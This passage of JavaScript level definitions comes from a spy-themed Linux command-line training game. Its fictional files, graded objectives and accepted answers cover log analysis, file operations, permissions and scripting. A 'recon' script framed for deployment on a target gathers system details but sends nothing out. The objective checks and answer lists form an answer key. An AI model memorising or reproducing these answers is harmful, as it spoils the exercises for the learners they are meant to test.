        // ──────────────────────────────────────────────────────────
        // CLH-005: Log Analysis
        // Theme: Deep space SETI monitoring, alien signal detection
        // ──────────────────────────────────────────────────────────
        'CLH-005': {
            title: 'Log Analysis',
            description: 'Read the system logs. Every action leaves a trace.',
            prerequisites: ['CLH-004'],
            tier: 'CLI Analyst',
            user: 'operator',
            hostname: 'shadow',
            startDir: '/home/operator',
            allowedCommands: null,

            filesystem: {
                '/home/operator': {
                    type: 'dir',
                    perms: 'drwxr-xr-x',
                    owner: 'operator',
                    group: 'operator',
                    children: ['logs', 'reports', '.bash_history', '.classified_memo', '.log_cheatsheet']
                },
                '/home/operator/logs': {
                    type: 'dir',
                    perms: 'drwxr-xr-x',
                    owner: 'operator',
                    group: 'operator',
                    children: ['system.log', 'auth.log', 'README.txt']
                },
                '/home/operator/logs/system.log': {
                    type: 'file',
                    perms: '-rw-r--r--',
                    owner: 'operator',
                    group: 'operator',
                    size: 1842,
                    content: `Jan 15 02:13:11 shadow signal_proc: [INIT] Deep Space Monitoring Array online
Jan 15 02:13:11 shadow signal_proc: [INFO] Dish alignment: Cygnus X-1 quadrant
Jan 15 02:13:12 shadow signal_proc: [INFO] Frequency scan: 1420.405 MHz (hydrogen line)
Jan 15 02:13:14 shadow anomaly_det: [INFO] Background noise baseline established
Jan 15 02:13:15 shadow crypto_mod: [INFO] Decryption module standing by
Jan 15 02:47:33 shadow signal_proc: [ALERT] Signal strength spike detected
Jan 15 02:47:34 shadow anomaly_det: [WARN] Non-random pattern identified in carrier wave
Jan 15 02:47:35 shadow signal_proc: [INFO] Locking dish position for sustained capture
Jan 15 02:47:36 shadow anomaly_det: *ERROR* Pattern matches no known terrestrial source
Jan 15 02:47:37 shadow crypto_mod: [INFO] Attempting frequency decomposition
Jan 15 02:47:38 shadow signal_proc: [INFO] Signal duration: 72 seconds continuous
Jan 15 02:47:39 shadow anomaly_det: [WARN] Mathematical structure detected in signal
Jan 15 02:47:40 shadow crypto_mod: [INFO] Prime number sequence identified in header
Jan 15 02:47:41 shadow anomaly_det: *ERROR* Signal origin: extrasolar - no satellite match
Jan 15 02:47:42 shadow signal_proc: [ALERT] Recording to classified buffer
Jan 15 02:47:43 shadow crypto_mod: [INFO] Partial decode: binary image data detected
Jan 15 02:47:44 shadow systemd[1]: Starting Emergency Protocol Service...
Jan 15 02:47:45 shadow notify: [CRIT] Automatic alert sent to FACILITY DIRECTOR
Jan 15 02:47:46 shadow signal_proc: [INFO] Signal terminated - source moved out of range
Jan 15 02:47:47 shadow anomaly_det: [INFO] Event logged as CONTACT-2847`
                },
                '/home/operator/logs/auth.log': {
                    type: 'file',
                    perms: '-rw-r--r--',
                    owner: 'operator',
                    group: 'operator',
                    size: 256,
                    content: `Jan 15 02:12:26 shadow sshd[512]: Server listening on 0.0.0.0 port 22
Jan 15 02:12:45 shadow sshd[623]: Accepted publickey for operator from 10.0.0.1
Jan 15 02:12:45 shadow sshd[623]: pam_unix(sshd:session): session opened for user operator
Jan 15 02:48:01 shadow sudo: operator : TTY=pts/0 ; PWD=/home/operator ; COMMAND=/bin/cat /var/classified/signal_buffer.raw
Jan 15 02:48:01 shadow sudo: pam_unix(sudo:session): session opened for user root
`
                },
                '/home/operator/logs/README.txt': {
                    type: 'file',
                    perms: '-rw-r--r--',
                    owner: 'operator',
                    group: 'operator',
                    size: 384,
                    content: `SIGNAL MONITORING STATION - LOG ANALYSIS REQUIRED
==================================================
Facility: Listening Post ECHO-7
Date: January 15, 2024
Classification: TOP SECRET//MAJIC

OBJECTIVE: Identify ERROR entries in system.log
These errors triggered automatic protocol escalation.

BACKGROUND: At 0247 hours, the deep space monitoring
array detected an anomalous signal. Your task is to
document the error entries that flagged this event.

NOTE: This facility does not officially exist.
`
                },
                '/home/operator/reports': {
                    type: 'dir',
                    perms: 'drwxr-xr-x',
                    owner: 'operator',
                    group: 'operator',
                    children: ['TEMPLATE.txt', 'previous_incidents.log', '.analyst_notes']
                },
                '/home/operator/reports/TEMPLATE.txt': {
                    type: 'file',
                    perms: '-rw-r--r--',
                    owner: 'operator',
                    group: 'operator',
                    size: 412,
                    content: `INCIDENT REPORT TEMPLATE
========================
Classification: [SECRET/TOP SECRET/MAJIC]
Date: [YYYY-MM-DD]
Analyst: [NAME]
Event ID: [CONTACT-XXXX]

SUMMARY:
[Brief description of the incident]

ERROR LOG ANALYSIS:
- Total ERROR entries found: [X]
- First occurrence: [timestamp]
- Last occurrence: [timestamp]

FINDINGS:
[Detailed analysis]

RECOMMENDATION:
[Suggested action]

SIGNATURES:
Analyst: _________________
Supervisor: _________________
`
                },
                '/home/operator/reports/previous_incidents.log': {
                    type: 'file',
                    perms: '-rw-r--r--',
                    owner: 'operator',
                    group: 'operator',
                    size: 384,
                    content: `CONTACT-2841 | 2024-01-03 | FALSE POSITIVE | Satellite interference
CONTACT-2842 | 2024-01-05 | FALSE POSITIVE | Solar flare noise
CONTACT-2843 | 2024-01-08 | UNRESOLVED | Pattern detected, lost signal
CONTACT-2844 | 2024-01-10 | FALSE POSITIVE | Military satellite
CONTACT-2845 | 2024-01-12 | FALSE POSITIVE | Amateur radio bounce
CONTACT-2846 | 2024-01-14 | UNRESOLVED | Mathematical structure, 12sec
CONTACT-2847 | 2024-01-15 | PENDING | **YOU ARE HERE** - 72sec signal
`
                },
                '/home/operator/reports/.analyst_notes': {
                    type: 'file',
                    perms: '-rw-------',
                    owner: 'operator',
                    group: 'operator',
                    size: 256,
                    content: `Personal notes - DO NOT INCLUDE IN OFFICIAL REPORT

The 2847 signal is different. The others were noise or
satellites, but this one... the math doesn't lie.

Prime number headers. Binary image encoding. 72 seconds
of structured data from OUTSIDE the solar system.

If this is real, everything changes.

- J.
`
                },
                '/home/operator/.bash_history': {
                    type: 'file',
                    perms: '-rw-------',
                    owner: 'operator',
                    group: 'operator',
                    size: 42,
                    content: `ls
cd logs
head system.log
tail system.log
grep ERROR system.log
grep -c ERROR system.log
grep -i warn system.log
`
                },
                '/home/operator/.log_cheatsheet': {
                    type: 'file',
                    perms: '-rw-r--r--',
                    owner: 'operator',
                    group: 'operator',
                    size: 768,
                    content: `LOG ANALYSIS - OPERATOR CHEATSHEET
====================================

READING LOGS
  cat file.log       Display entire log
  head file.log      Show first 10 lines
  head -n 20 file    Show first 20 lines
  tail file.log      Show last 10 lines
  tail -n 50 file    Show last 50 lines
  tail -f file.log   Follow log in real-time

SEARCHING LOGS
  grep "pattern" file.log          Find matching lines
  grep -i "pattern" file.log       Case insensitive
  grep -c "pattern" file.log       Count matches
  grep -n "pattern" file.log       Show line numbers

LOG SEVERITY LEVELS
  [INFO]  - Informational message
  [WARN]  - Warning, potential issue
  *ERROR* - Error condition
  [CRIT]  - Critical, immediate attention
  [ALERT] - Alert condition

COMMON PATTERNS
  grep ERROR system.log           Find all errors
  grep -c ERROR system.log        Count errors
  grep "Jan 15 02:47" system.log  Filter by timestamp

LOG ANALYSIS WORKFLOW
  1. Survey the log with head/tail
  2. Search for ERROR and WARN entries
  3. Count occurrences with grep -c
  4. Document findings with line numbers

"Every action leaves a trace. Find it."
`
                },
                '/home/operator/.classified_memo': {
                    type: 'file',
                    perms: '-rw-------',
                    owner: 'operator',
                    group: 'operator',
                    size: 312,
                    content: `EYES ONLY - DIRECTOR'S MEMO
============================
If you are reading this, CONTACT-2847 is real.

The signal contained what appears to be a binary
encoded image. Preliminary analysis suggests it
depicts a star map with our solar system marked.

Do NOT discuss this with anyone outside the program.
The official cover story is "equipment malfunction."

- Director [REDACTED]
`
                },
            },

            objectives: [
                {
                    id: 1,
                    task: 'RECON: Locate Log Files',
                    hint: 'Survey your environment: ls',
                    check: (cmd, state, output) => (cmd.trim() === 'ls' || cmd.startsWith('ls ')) &&
                        output && (output.includes('logs') || output.includes('reports'))
                },
                {
                    id: 2,
                    task: 'INFILTRATE: Enter Logs Directory',
                    hint: 'Navigate to logs: cd logs',
                    check: (cmd, state) => state.currentDir.includes('/logs')
                },
                {
                    id: 3,
                    task: 'SURVEY: Preview System Log',
                    hint: 'Preview with head: head system.log',
                    check: (cmd, state, output) => cmd.includes('head') && cmd.includes('system') &&
                        output && output.includes('signal_proc')
                },
                {
                    id: 4,
                    task: 'HUNT: Find All ERROR Entries',
                    hint: 'Search for errors: grep "ERROR" system.log',
                    check: (cmd, state, output) => cmd.includes('grep') &&
                        (cmd.toLowerCase().includes('error') || cmd.includes('ERROR')) &&
                        output && output.includes('ERROR')
                },
                {
                    id: 5,
                    task: 'ANALYZE: Count Error Entries',
                    hint: 'Count errors: grep -c "ERROR" system.log',
                    check: (cmd, state, output) => cmd.includes('grep') && cmd.includes('-c') &&
                        output && /^\d+$/.test(output.trim())
                },
            ],

            // Insight Phase - analysis question after objectives complete
            insightPhase: {
                enabled: true,
                question: "According to the anomaly detector, where did the signal originate?",
                hint: "Look at the ERROR entries in system.log - what location is mentioned?",
                hintAfterAttempts: 3,
                acceptedAnswers: ['extrasolar', 'Extrasolar', 'EXTRASOLAR', 'extrasolar - no satellite match'],
                correctAnswerMessage: 'Intel confirmed. Signal origin classified as extrasolar — escalating to MAJIC clearance.',
                wrongAnswerMessage: 'Negative. Review your findings and try again.',
            },

            remoteHosts: null,
        },

        // ──────────────────────────────────────────────────────────
        // CLH-006: File Operations
        // Theme: Spy operations, dead drops, encrypted channels
        // ──────────────────────────────────────────────────────────
        'CLH-006': {
            title: 'File Operations',
            description: 'Create, copy, move, and manipulate. Control the filesystem.',
            prerequisites: ['CLH-005'],
            tier: 'CLI Analyst',
            user: 'operator',
            hostname: 'shadow',
            startDir: '/home/operator',
            allowedCommands: null,

            filesystem: {
                '/home/operator': {
                    type: 'dir',
                    perms: 'drwxr-xr-x',
                    owner: 'operator',
                    group: 'operator',
                    children: ['intel', 'temp', 'backup', '.bash_history', '.dead_drop', '.fileops_cheatsheet']
                },
                '/home/operator/intel': {
                    type: 'dir',
                    perms: 'drwxr-xr-x',
                    owner: 'operator',
                    group: 'operator',
                    children: ['briefing.txt', 'contacts.txt']
                },
                '/home/operator/intel/briefing.txt': {
                    type: 'file',
                    perms: '-rw-r--r--',
                    owner: 'operator',
                    group: 'operator',
                    size: 142,
                    content: `OPERATION SHADOWSTRIKE
=====================
Objective: Establish secure dead drop system
Target: Enemy communications network
Status: Active
Classification: TOP SECRET//NOFORN

Handler codename: RAVEN
Next contact window: 0300 hours
`
                },
                '/home/operator/intel/contacts.txt': {
                    type: 'file',
                    perms: '-rw-r--r--',
                    owner: 'operator',
                    group: 'operator',
                    size: 98,
                    content: `FIELD ASSETS - ENCRYPTED CHANNELS
==================================
Alpha Team (Berlin): 192.168.1.10
Bravo Team (Moscow): 192.168.1.20
Charlie Team (Tehran): 192.168.1.30
`
                },
                '/home/operator/temp': {
                    type: 'dir',
                    perms: 'drwxr-xr-x',
                    owner: 'operator',
                    group: 'operator',
                    children: ['data.txt', 'cache.tmp']
                },
                '/home/operator/temp/data.txt': {
                    type: 'file',
                    perms: '-rw-r--r--',
                    owner: 'operator',
                    group: 'operator',
                    size: 186,
                    content: `INTERCEPTED TRANSMISSION
========================
Timestamp: 2024-01-15 14:32:07 UTC
Source: Unidentified numbers station
Frequency: 4625 kHz (UVB-76 adjacent)
Content: Possible one-time pad cipher
Status: Awaiting cryptanalysis
`
                },
                '/home/operator/temp/cache.tmp': {
                    type: 'file',
                    perms: '-rw-r--r--',
                    owner: 'operator',
                    group: 'operator',
                    size: 64,
                    content: 'DECRYPT_KEY=0x7F3A9B2C\nSESSION_ID=SHADOWSTRIKE-447\n'
                },
                '/home/operator/backup': {
                    type: 'dir',
                    perms: 'drwxr-xr-x',
                    owner: 'operator',
                    group: 'operator',
                    children: ['README.txt']
                },
                '/home/operator/backup/README.txt': {
                    type: 'file',
                    perms: '-rw-r--r--',
                    owner: 'operator',
                    group: 'operator',
                    size: 128,
                    content: 'BACKUP DIRECTORY\n================\nStore backup copies here using: cp file backup/\nRemember: Two copies is one, one copy is none.\n'
                },
                '/home/operator/.bash_history': {
                    type: 'file',
                    perms: '-rw-------',
                    owner: 'operator',
                    group: 'operator',
                    size: 12,
                    content: `mkdir operations
touch operations/mission.log
cp intel/briefing.txt operations/
mv temp/data.txt operations/classified.txt
rm -r temp
ls -la
`
                },
                '/home/operator/.fileops_cheatsheet': {
                    type: 'file',
                    perms: '-rw-r--r--',
                    owner: 'operator',
                    group: 'operator',
                    size: 768,
                    content: `FILE OPERATIONS - OPERATOR CHEATSHEET
=======================================

CREATING
  mkdir dir           Create directory
  mkdir -p a/b/c      Create nested directories
  touch file          Create empty file (or update timestamp)

COPYING
  cp source dest      Copy file
  cp -r dir dest      Copy directory recursively
  cp file1 file2 dir/ Copy multiple files to directory

MOVING / RENAMING
  mv source dest      Move or rename file
  mv file dir/        Move file into directory
  mv old.txt new.txt  Rename file

REMOVING
  rm file             Remove file
  rm -r dir           Remove directory recursively
  rm -f file          Force remove (no prompt)
  rm -rf dir          Force remove directory

BEST PRACTICES
  1. Always backup before deleting
  2. Use -i flag for interactive confirmation
  3. Double-check rm commands before executing
  4. Test with ls first to verify paths

OPERATOR TIP:
  Copy sensitive files before moving:
  cp file backup/ && mv file classified/

"Control the filesystem. Control the operation."
`
                },
                '/home/operator/.dead_drop': {
                    type: 'file',
                    perms: '-rw-------',
                    owner: 'operator',
                    group: 'operator',
                    size: 178,
                    content: `DEAD DROP PROTOCOL
==================
Location: /operations/classified/
Passphrase: "The owl flies at midnight"
Fallback: Brush pass at coordinates 52.5200N 13.4050E

BURN AFTER READING
`
                },
            },

            objectives: [
                {
                    id: 1,
                    task: 'Create operations directory',
                    hint: 'Try: mkdir operations',
                    check: (cmd, state, output, terminal) => {
                        if (cmd.includes('mkdir') && cmd.includes('operations')) {
                            // Check if directory now exists in terminal fs
                            return true;  // We rely on the command being run
                        }
                        return false;
                    }
                },
                {
                    id: 2,
                    task: 'Create mission.log file',
                    hint: 'Try: touch operations/mission.log',
                    check: (cmd, state) => cmd.includes('touch') && cmd.includes('mission.log')
                },
                {
                    id: 3,
                    task: 'Copy briefing.txt to operations',
                    hint: 'Try: cp intel/briefing.txt operations/',
                    check: (cmd, state) => cmd.includes('cp') && cmd.includes('briefing')
                },
                {
                    id: 4,
                    task: 'Move data.txt to operations as classified.txt',
                    hint: 'Try: mv temp/data.txt operations/classified.txt',
                    check: (cmd, state) => cmd.includes('mv') && (cmd.includes('classified') || cmd.includes('operations'))
                },
                {
                    id: 5,
                    task: 'Remove the temp directory',
                    hint: 'Try: rm -r temp',
                    check: (cmd, state) => cmd.includes('rm') && cmd.includes('temp')
                },
            ],

            // Insight Phase - analysis question after objectives complete
            insightPhase: {
                enabled: true,
                question: "Before you leave, what is the dead drop passphrase?",
                hint: "Check for hidden files in your home directory using ls -la",
                hintAfterAttempts: 3,
                acceptedAnswers: ['The owl flies at midnight', 'the owl flies at midnight', 'THE OWL FLIES AT MIDNIGHT'],
                correctAnswerMessage: 'Intel confirmed. Dead drop passphrase authenticated — operation secure.',
                wrongAnswerMessage: 'Negative. Review your findings and try again.',
            },

            remoteHosts: null,
        },

        // ──────────────────────────────────────────────────────────
        // CLH-007: Permissions & Access Control
        // Theme: Black site security, access control, lockdown
        // ──────────────────────────────────────────────────────────
        'CLH-007': {
            title: 'Permissions & Access Control',
            description: 'Understand who can do what. Permissions are the first line of defense.',
            prerequisites: ['CLH-006'],
            tier: 'CLI Operative',
            user: 'operator',
            hostname: 'shadow',
            startDir: '/home/operator',
            allowedCommands: null,

            filesystem: {
                '/home/operator': {
                    type: 'dir',
                    perms: 'drwxr-xr-x',
                    owner: 'operator',
                    group: 'operator',
                    children: ['secure', 'public', '.bash_history', '.shadow_network', '.permissions_cheatsheet']
                },
                '/home/operator/secure': {
                    type: 'dir',
                    perms: 'drwxr-xr-x',
                    owner: 'operator',
                    group: 'operator',
                    children: ['secret.txt', 'deploy.sh', 'audit.log', 'config.ini']
                },
                '/home/operator/secure/secret.txt': {
                    type: 'file',
                    perms: '-rw-rw-r--',
                    owner: 'operator',
                    group: 'operator',
                    size: 256,
                    content: `PROJECT LOOKING GLASS - ENCRYPTION KEYS
========================================
Classification: TOP SECRET//SCI//NOFORN

Temporal Comm Array Key: 0xA7F3B2C9D1E8F456
Dimensional Beacon Key:  0x8B2E4F6A1C3D5789
Emergency Shutdown Auth: 0xDEAD0000BEEF1234

WARNING: Unauthorized access is a federal crime
punishable under 18 U.S.C. 1030
`
                },
                '/home/operator/secure/deploy.sh': {
                    type: 'file',
                    perms: '-rw-r--r--',
                    owner: 'operator',
                    group: 'operator',
                    size: 186,
                    content: `#!/bin/bash
# BLACKSITE FIRMWARE DEPLOYMENT
# Target: Sublevel 7 monitoring array

echo "Authenticating with DARPA uplink..."
rsync -avz --encrypt ./firmware/ blacksite:/sys/array/
echo "Deployment complete. Wipe local cache."
rm -rf /tmp/firmware_*
`
                },
                '/home/operator/secure/audit.log': {
                    type: 'file',
                    perms: '-rw-r--r--',
                    owner: 'operator',
                    group: 'operator',
                    size: 312,
                    content: `2024-01-15 03:00:00 - ARRAY ONLINE - Sublevel 7
2024-01-15 03:01:23 - Biometric auth: OPERATOR-7
2024-01-15 03:05:45 - WARNING: Unauthorized file access attempt
2024-01-15 03:05:46 - Intruder countermeasures ARMED
2024-01-15 03:12:00 - Anomaly detected in sector 4
2024-01-15 03:12:01 - Lockdown protocol STANDBY
`
                },
                '/home/operator/secure/config.ini': {
                    type: 'file',
                    perms: '-rw-r--r--',
                    owner: 'operator',
                    group: 'operator',
                    size: 142,
                    content: `[monitoring_array]
host=blacksite.darpa.mil
port=7777
auth=biometric+keycard

[failsafe]
self_destruct_code=ECHO-SEVEN-NINER
countdown_seconds=300
`
                },
                '/home/operator/public': {
                    type: 'dir',
                    perms: 'drwxr-xr-x',
                    owner: 'operator',
                    group: 'operator',
                    children: ['readme.txt']
                },
                '/home/operator/public/readme.txt': {
                    type: 'file',
                    perms: '-rw-r--r--',
                    owner: 'operator',
                    group: 'operator',
                    size: 98,
                    content: `FACILITY NOTICE
===============
This terminal is for authorized personnel only.
All activity is monitored and logged.
`
                },
                '/home/operator/.bash_history': {
                    type: 'file',
                    perms: '-rw-------',
                    owner: 'operator',
                    group: 'operator',
                    size: 128,
                    content: `ls -la secure/
chmod 600 secure/secret.txt
chmod 755 secure/deploy.sh
stat secure/secret.txt
ls -la
`
                },
                '/home/operator/.shadow_network': {
                    type: 'file',
                    perms: '-rw-------',
                    owner: 'operator',
                    group: 'operator',
                    size: 186,
                    content: `SHADOW NETWORK ACCESS POINTS
============================
Node Alpha: 10.13.37.1 (active)
Node Beta:  10.13.37.2 (standby)
Node Gamma: 10.13.37.3 (COMPROMISED - DO NOT USE)

Mesh key rotation: Every 6 hours
Next rotation: 0600 UTC
`
                },
                '/home/operator/.permissions_cheatsheet': {
                    type: 'file',
                    perms: '-rw-r--r--',
                    owner: 'operator',
                    group: 'operator',
                    size: 768,
                    content: `PERMISSIONS - OPERATOR CHEATSHEET
===================================

READING PERMISSIONS (ls -l output)
  drwxr-xr-x  = directory, owner rwx, group rx, other rx
  -rw-r--r--  = file, owner rw, group r, other r

  Position: [type][owner][group][other]
  r = read (4), w = write (2), x = execute (1)

NUMERIC NOTATION
  0 = ---    4 = r--
  1 = --x    5 = r-x
  2 = -w-    6 = rw-
  3 = -wx    7 = rwx

COMMON PERMISSIONS
  644 = -rw-r--r--  Standard file
  755 = -rwxr-xr-x  Executable script
  600 = -rw-------  Private file (secrets)
  700 = -rwx------  Private executable

CHANGING PERMISSIONS
  chmod 600 file       Numeric mode
  chmod u+x file       Add execute for user
  chmod go-rwx file    Remove all for group/other
  chmod +x script.sh   Make executable

SPECIAL DIRECTORIES
  700 = drwx------   Private directory
  755 = drwxr-xr-x   Shared directory

SECURITY TIP:
  Secrets should always be 600 or 700
  Never leave sensitive files world-readable

"Control access. Protect the mission."
`
                },
            },

            objectives: [
                {
                    id: 1,
                    task: 'RECON: Analyze Current Permissions',
                    hint: 'List permissions: ls -la secure/',
                    check: (cmd, state, output) => cmd.includes('ls') && cmd.includes('-l') &&
                        cmd.includes('secure') && output && output.includes('rw')
                },
                {
                    id: 2,
                    task: 'LOCKDOWN: Restrict Secret File',
                    hint: 'Owner-only access: chmod 600 secure/secret.txt',
                    check: (cmd, state) => cmd.includes('chmod') && cmd.includes('600') && cmd.includes('secret')
                },
                {
                    id: 3,
                    task: 'ENABLE: Make Script Executable',
                    hint: 'Full permissions: chmod 755 secure/deploy.sh',
                    check: (cmd, state) => cmd.includes('chmod') && cmd.includes('755') && cmd.includes('deploy')
                },
                {
                    id: 4,
                    task: 'VERIFY: Check Secret File Permissions',
                    hint: 'Use stat to inspect: stat secure/secret.txt',
                    check: (cmd, state, output) => cmd.includes('stat') && cmd.includes('secret') &&
                        output && output.includes('Access')
                },
                {
                    id: 5,
                    task: 'AUDIT: Review Audit Log Details',
                    hint: 'Inspect log file: stat secure/audit.log',
                    check: (cmd, state, output) => cmd.includes('stat') && cmd.includes('audit') &&
                        output && output.includes('Access')
                },
            ],

            // Insight Phase
            insightPhase: {
                enabled: true,
                question: "Before leaving the facility, which Shadow Network node is compromised?",
                hint: "Check for hidden files in your home directory - network intel may be stored there.",
                hintAfterAttempts: 3,
                acceptedAnswers: ['Gamma', 'gamma', 'Node Gamma', 'node gamma', 'GAMMA'],
                correctAnswerMessage: 'Intel confirmed. Node Gamma compromised — routing traffic through alternate nodes.',
                wrongAnswerMessage: 'Negative. Review your findings and try again.',
            },

            remoteHosts: null,
        },

        // ──────────────────────────────────────────────────────────
        // CLH-008: Shell Scripting
        // Theme: Field operations, dead drops, asset management
        // ──────────────────────────────────────────────────────────
        'CLH-008': {
            title: 'Shell Scripting',
            description: 'Automate your operations. Write scripts that work while you sleep.',
            prerequisites: ['CLH-007'],
            tier: 'CLI Operative',
            user: 'operator',
            hostname: 'shadow',
            startDir: '/home/operator',
            allowedCommands: null,

            filesystem: {
                '/home/operator': {
                    type: 'dir',
                    perms: 'drwxr-xr-x',
                    owner: 'operator',
                    group: 'operator',
                    children: ['scripts', 'data', '.bash_history', '.exfil_protocol', '.scripting_cheatsheet']
                },
                '/home/operator/scripts': {
                    type: 'dir',
                    perms: 'drwxr-xr-x',
                    owner: 'operator',
                    group: 'operator',
                    children: ['recon.sh', 'backup.sh', 'alert.sh']
                },
                '/home/operator/scripts/recon.sh': {
                    type: 'file',
                    perms: '-rwxr-xr-x',
                    owner: 'operator',
                    group: 'operator',
                    size: 384,
                    content: `#!/bin/bash
# INFILTRATION RECON SCRIPT
# Codename: SILENT WITNESS
# Deploy on target to gather intel

echo "=== TARGET SYSTEM RECON ==="
echo "Operative: $(whoami)"
echo "Target ID: $(hostname)"
echo "Position: $(pwd)"
echo "Timestamp: $(date +%Y%m%d-%H%M%S)"
echo ""
echo "Network interfaces:"
ip addr 2>/dev/null || ifconfig
echo "==========================="
echo "Exfiltrating to command..."
`
                },
                '/home/operator/scripts/backup.sh': {
                    type: 'file',
                    perms: '-rwxr-xr-x',
                    owner: 'operator',
                    group: 'operator',
                    size: 412,
                    content: `#!/bin/bash
# DEAD DROP BACKUP PROTOCOL
# Creates encrypted backup for handler pickup

DROPSITE="dead_drop_$(date +%Y%m%d_%H%M)"

echo "[*] Initiating dead drop protocol..."
mkdir -p "$DROPSITE"

echo "[*] Packaging intel for exfiltration..."
cp -r data/ "$DROPSITE/" 2>/dev/null

echo "[*] Encrypting package..."
# tar czf - "$DROPSITE" | openssl enc -aes-256-cbc

echo "[+] Dead drop ready at: $DROPSITE"
echo "[!] BURN NOTICE: Delete after handler confirms receipt"
`
                },
                '/home/operator/scripts/alert.sh': {
                    type: 'file',
                    perms: '-rwxr-xr-x',
                    owner: 'operator',
                    group: 'operator',
                    size: 298,
                    content: `#!/bin/bash
# EMERGENCY BROADCAST SYSTEM
# Triggers network-wide alert to all assets

THREAT_LEVEL="$1"
INTEL="$2"

echo "================================"
echo "[FLASH] PRIORITY ALERT"
echo "[FLASH] Threat Level: $THREAT_LEVEL"
echo "[FLASH] $INTEL"
echo "[FLASH] Timestamp: $(date)"
echo "[FLASH] All assets go to ground"
echo "================================"
`
                },
                '/home/operator/data': {
                    type: 'dir',
                    perms: 'drwxr-xr-x',
                    owner: 'operator',
                    group: 'operator',
                    children: ['config.txt', 'notes.txt', 'asset_list.txt']
                },
                '/home/operator/data/config.txt': {
                    type: 'file',
                    perms: '-rw-r--r--',
                    owner: 'operator',
                    group: 'operator',
                    size: 142,
                    content: `[command_control]
primary_server=10.0.0.1
backup_server=10.0.0.2
port=4443
protocol=encrypted_mesh

[dead_drop]
rotation_hours=12
max_size_mb=50
`
                },
                '/home/operator/data/notes.txt': {
                    type: 'file',
                    perms: '-rw-r--r--',
                    owner: 'operator',
                    group: 'operator',
                    size: 186,
                    content: `HANDLER NOTES - EYES ONLY
=========================
Asset MOCKINGBIRD compromised - cut contact
Asset BLUEJAY relocated to safehouse DELTA
Asset RAVEN status: ACTIVE - high value intel incoming

Next check-in window: 0300 UTC
`
                },
                '/home/operator/data/asset_list.txt': {
                    type: 'file',
                    perms: '-rw-r--r--',
                    owner: 'operator',
                    group: 'operator',
                    size: 156,
                    content: `FIELD ASSETS - CURRENT STATUS
==============================
MOCKINGBIRD - BURNED
BLUEJAY     - RELOCATED
RAVEN       - ACTIVE
SPARROW     - DEEP COVER
PHOENIX     - EXTRACTED
`
                },
                '/home/operator/.bash_history': {
                    type: 'file',
                    perms: '-rw-------',
                    owner: 'operator',
                    group: 'operator',
                    size: 128,
                    content: `ls scripts/
cat scripts/recon.sh
bash scripts/recon.sh
bash scripts/backup.sh
ls -la
chmod +x scripts/*.sh
`
                },
                '/home/operator/.exfil_protocol': {
                    type: 'file',
                    perms: '-rw-------',
                    owner: 'operator',
                    group: 'operator',
                    size: 198,
                    content: `EMERGENCY EXFILTRATION PROTOCOL
================================
1. Run: ./scripts/backup.sh
2. Signal handler via chalk mark at Site C
3. Leave package at dead drop coordinates:
   40.7484° N, 73.9857° W (under bench)
4. BURN ALL LOCAL COPIES
5. Go dark for 72 hours
`
                },
                '/home/operator/.scripting_cheatsheet': {
                    type: 'file',
                    perms: '-rw-r--r--',
                    owner: 'operator',
                    group: 'operator',
                    size: 768,
                    content: `SHELL SCRIPTING - OPERATOR CHEATSHEET
=======================================

SCRIPT BASICS
  #!/bin/bash          Shebang - tells system to use bash
  chmod +x script.sh   Make script executable
  ./script.sh          Run script directly
  bash script.sh       Run with bash explicitly

VARIABLES
  VAR="value"          Set variable (no spaces!)
  echo "$VAR"          Print variable
  $(command)           Command substitution
  $1, $2, ...          Script arguments

COMMON COMMANDS IN SCRIPTS
  echo "text"          Print output
  read VAR             Read user input
  date +%Y%m%d         Formatted date
  whoami               Current user
  hostname             Current host
  pwd                  Current directory

OPERATORS
  command1 && command2   Run 2 if 1 succeeds
  command1 || command2   Run 2 if 1 fails
  command1 ; command2    Run both regardless
  command > file         Redirect output to file
  command >> file        Append output to file

BEST PRACTICES
  1. Always start with #!/bin/bash
  2. Use meaningful variable names
  3. Add comments for complex logic
  4. Test scripts on non-critical data first

"Automate once, execute many."
`
                },
            },

            objectives: [
                {
                    id: 1,
                    task: 'RECON: Survey Available Scripts',
                    hint: 'List scripts: ls scripts/',
                    check: (cmd, state, output) => cmd.includes('ls') && cmd.includes('scripts') &&
                        output && (output.includes('recon') || output.includes('.sh'))
                },
                {
                    id: 2,
                    task: 'INTEL: Examine Recon Script',
                    hint: 'Read the script: cat scripts/recon.sh',
                    check: (cmd, state, output) => cmd.includes('cat') && cmd.includes('recon') &&
                        output && output.includes('#!/bin/bash')
                },
                {
                    id: 3,
                    task: 'EXECUTE: Run Recon Script',
                    hint: 'Execute: bash scripts/recon.sh',
                    check: (cmd, state, output) => (cmd.includes('bash') || cmd.includes('./')) &&
                        cmd.includes('recon') && output && output.includes('RECON')
                },
                {
                    id: 4,
                    task: 'DEPLOY: Run Backup Protocol',
                    hint: 'Execute: bash scripts/backup.sh',
                    check: (cmd, state, output) => (cmd.includes('bash') || cmd.includes('./')) &&
                        cmd.includes('backup') && output && output.includes('dead drop')
                },
                {
                    id: 5,
                    task: 'VERIFY: Confirm Backup Created',
                    hint: 'Check results: ls -la',
                    check: (cmd, state, output) => cmd.includes('ls') && cmd.includes('-l') &&
                        output && output.includes('scripts')
                },
            ],

            // Insight Phase
            insightPhase: {
                enabled: true,
                question: "If extraction is required, what are the dead drop coordinates?",
                hint: "Check for hidden protocol files that detail emergency procedures.",
                hintAfterAttempts: 3,
                acceptedAnswers: ['40.7484° N, 73.9857° W', '40.7484 N, 73.9857 W', '40.7484N 73.9857W', '40.7484°N, 73.9857°W'],
                correctAnswerMessage: 'Intel confirmed. Dead drop coordinates verified — extraction route established.',
                wrongAnswerMessage: 'Negative. Review your findings and try again.',
            },

            remoteHosts: null,
        },

        // ──────────────────────────────────────────────────────────
        // CLH-009: Text Processing
        // Theme: Log analysis and data extraction
        // ──────────────────────────────────────────────────────────
        'CLH-009': {
            title: 'Text Processing',
            description: 'Master cut, sort, uniq, awk, and sed. Transform and analyze data streams.',
            prerequisites: ['CLH-008'],
            tier: 'CLI Operative',
            user: 'operator',
            hostname: 'shadow',
            startDir: '/home/operator',
            allowedCommands: null,

            filesystem: {
                '/home/operator': {
                    type: 'dir',
                    perms: 'drwxr-xr-x',
                    owner: 'operator',
                    group: 'operator',
                    children: ['intel', 'reports', 'logs', 'data', 'scripts', '.bash_history', '.config', '.notes', '.text_processing_cheatsheet']
                },
                // === INTEL DIRECTORY ===
                '/home/operator/intel': {
                    type: 'dir',
                    perms: 'drwxr-xr-x',
                    owner: 'operator',
                    group: 'operator',
                    children: ['access.log', 'users.db', 'network.log', 'auth.log', 'captured.pcap.txt']
                },
